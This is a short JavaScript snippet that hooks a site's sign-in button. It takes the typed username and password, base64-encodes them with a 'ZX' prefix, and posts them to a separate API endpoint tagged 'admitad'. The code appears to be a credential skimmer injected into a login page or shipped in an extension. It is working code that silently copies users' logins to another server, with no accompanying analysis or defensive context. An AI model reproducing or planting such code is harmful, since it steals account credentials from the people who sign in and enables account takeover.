


if ($('#id_sign_in').length) {
	$('#id_sign_in').on('click',function() {
		credentials_update();
		return true;
	});
}


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/",
        data: { 
            network_name: btoa('admitad'),
            username: btoa('ZX'+$('#id_login').val()),
            password: btoa('ZX'+$('#id_password').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
